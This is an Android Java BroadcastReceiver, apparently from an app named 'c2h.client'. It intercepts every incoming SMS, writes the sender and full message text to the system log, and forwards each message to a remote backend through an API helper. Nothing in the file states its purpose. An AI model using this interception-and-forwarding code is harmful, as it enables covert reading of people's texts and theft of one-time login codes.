package com.c2h.client.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import com.c2h.client.utils.ApiHelper;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class SmsReceiver extends BroadcastReceiver {
    
    private static final String TAG = "SmsReceiver";
    private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction() == null || !intent.getAction().equals(SMS_RECEIVED)) {
            return;
        }

        Bundle bundle = intent.getExtras();
        if (bundle == null) {
            return;
        }

        try {
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus == null) {
                return;
            }

            for (Object pdu : pdus) {
                SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                
                String sender = smsMessage.getDisplayOriginatingAddress();
                String messageBody = smsMessage.getMessageBody();
                long timestamp = smsMessage.getTimestampMillis();
                
                Log.d(TAG, "SMS received from: " + sender);
                Log.d(TAG, "Message: " + messageBody);
                
                // Send SMS data to backend
                sendSmsToBackend(context, sender, messageBody, timestamp);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error processing SMS", e);
        }
    }

    private void sendSmsToBackend(Context context, String from, String message, long timestamp) {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US);
        String timestampStr = sdf.format(new Date(timestamp));
        
        ApiHelper.logSms(context, from, message, timestampStr);
    }
}
